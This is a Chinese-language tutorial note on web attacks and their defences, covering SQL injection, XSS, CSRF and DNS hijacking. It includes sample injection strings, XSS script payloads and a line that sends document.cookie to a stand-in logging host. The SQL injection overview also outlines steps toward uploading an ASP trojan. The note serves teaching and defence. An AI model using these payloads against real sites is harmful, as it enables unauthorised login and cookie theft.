`1.SQL注入攻击`  
没有对用户的输入进行合法性判断。  
用户可以输入一段数据库查询代码，根据程序返回的结果，获取他想得知的数据。  
> SQL注入攻击的总体思路：
-  发现SQL注入位置
- 判断后台数据库类型
- 确定XP_CMDSHELL可执行情况
- 发现WEB虚拟目录
- 上传ASP木马
- 得到管理员权限

> 举个例子
```
某个网站的登录验证的SQL查询代码为：
strSQL = "SELECT * FROM users WHERE (name = '" + username + "') and (pwd = '" + password + "')";
恶意填入
userName = " 1' or '1' = '1 " 与 pwd = " 1' or '1' = '1 "
将导致原本的SQL字符串被填充为
strSQL = "SELECT * FROM users WHERE (name = '1' or '1' = '1') and (pwd = '1' or '1' = '1')"
可就是实际运行的SQL命令为
strSQL = "SELECT * FROM users"
因此达到无账号密码，也可登录网站。SQL注入攻击被俗称为 黑客的填空游戏。
安全写法，写成???? 而不是多个引号。
```

> 如何预防SQL注入
- 输入验证是指要验证所有应用程序接收到的输入是否合法。
- 有两中不同类型的输入验证方法：白名单和黑名单验证
  - 白名单验证：比如id值，那么我们判断它是否为数字。
  - 黑名单验证：使用正则表达式禁止使用某些字符和字符串
- 应该尽量使用白名单，对于无法使用白名单的，使用黑名单提供局部限制。
- 敏感数据在数据库中加密存放
---

`2.跨站脚本XSS`  
黑客通过HTML注入篡改了页面，插入恶意脚本。
> 反射型XSS攻击  
- 一般会放在请求或者跳转的链接中，一次性造成攻击。  
- 在页面搜索框中输入`"/><script>alert('这是一个反射型XSS攻击')</script>`后点击确定，会弹出提示框。

> 存储式XSS攻击  
- 存储型XSS是指将恶意用户输入的脚本存到了数据库，当用到这条数据的时候，其中包含的脚本就会执行，并且只要数据库没有删除，那么这种攻击将一直存在，我们称这种XSS具有很强的稳定性。
- 新建用户，描述中输入`"/><script>alert("这是一个存储型xss攻击")</script>`保存后，后面的用户打开用户管理页面，查看到刚添加的用户所在页，都会弹出提示框。

> DOM Based XSS
- 改变了DOM的结构。
- `<a href = '来自用户输入'>点击</a>`  ---->
- `<a href='` + `'><div>12121212</div><'` +`'>点击</a>`

> cookie劫持
- XSS攻击者通过植入一段js脚本  
- `***src = "http://www.xss.com/log?"+escape(document.cookie)***`

> XSS钓鱼
- 钓鱼网站相信大家都不陌生，攻击者通过仿造一个和源站极度相似的网站来诱使被攻击者输入用户名密码。

> XSS Worm
- 蠕虫可以在短时间内感染互联网上的其他联网设备。
  
> 预防
- 将重要的cookie标记为http only, 这样的话Javascript 中的document.cookie语句就不能获取到cookie了。
- 表单数据规定值的类型。
- 对数据进行Html Encode 处理。
- 过滤或移除特殊的Html标签，例如: `<script>, <iframe> , &lt; for <, &gt; for >, &quot for`。
- 过滤JavaScript 事件的标签。例如 "onclick=", "onfocus" 等等。
---

`3.跨站请求伪造CSRF`
- 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。
- 跟跨网站脚本（XSS）相比，XSS 利用的是用户对指定网站的信任，CSRF利用的是网站对用户网页浏览器的信任。
- 跨站请求攻击，简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并运行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去运行。这利用了web中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。

> 预防
- `查询Referer字段`
  - HTTP头中有一个Referer字段，这个字段用以标明请求来源于哪个地址。
  - 在处理敏感数据请求时，通常来说，Referer字段应和请求的地址位于同一域名下。
  - 如果是CSRF攻击传来的请求，Referer字段会是包含恶意网址的地址，这时候服务器就能识别出恶意的访问。
- `添加校验token`
  - 如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在cookie中，并且攻击者无法伪造的数据作为校验。
  - 服务器将其生成并附加在窗体中，其内容是一个伪随机数。当客户端通过窗体提交请求时，这个伪随机数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪随机数，而通过CSRF传来的欺骗性攻击中，攻击者无从事先得知这个伪随机数的值，服务端就会因为校验token的值为空或者错误，拒绝这个可疑请求。
---

`4.DNS劫持`
- 域名劫持是互联网攻击的一种方式，通过攻击域名解析服务器（DNS），或伪造域名解析服务器（DNS）的方法，把目标网站域名解析到错误的地址从而实现用户无法访问目标网站的目的。
